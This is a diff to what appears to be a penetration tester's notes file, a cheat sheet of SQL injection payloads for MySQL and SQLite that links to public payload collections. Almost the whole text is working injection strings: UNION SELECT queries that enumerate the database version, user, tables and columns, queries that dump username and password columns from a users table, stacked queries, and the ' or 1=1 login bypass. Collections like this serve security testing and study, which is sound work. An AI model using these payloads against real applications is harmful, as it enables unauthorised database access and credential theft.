@@ -13,13 +13,14 @@ mysql injection:
 https://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet
 
 ```
- ' union select null,null,version() #
- ' union select null,null,user() #
- ' union select null,null,database() #
- ' union select null,username,password from users #
- ' union select null,table_schema,table_name FROM information_schema.tables #
- ' union select null,table_name,column_name FROM information_schema.columns #
+' union select null,null,version() #
+' union select null,null,user() #
+' union select null,null,database() #
+' union select null,username,password from users #
+' union select null,table_schema,table_name FROM information_schema.tables #
+' union select null,table_name,column_name FROM information_schema.columns #
 
+'; select version() #
 ' or 1=1
 ```
 
@@ -27,10 +28,10 @@ sqlite injection:
 https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md
 
 ```
- ' union select null,null,sqlite_version() --
- ' union select null,username,password from users --
- ' union select name from sqlite_schema --
+' union select null,null,sqlite_version() --
+' union select null,username,password from users --
+' union select name from sqlite_schema --
 
-'; SELECT sql FROM sqlite_schema --
+'; select sql from sqlite_schema --
 ' or 1=1
 ```
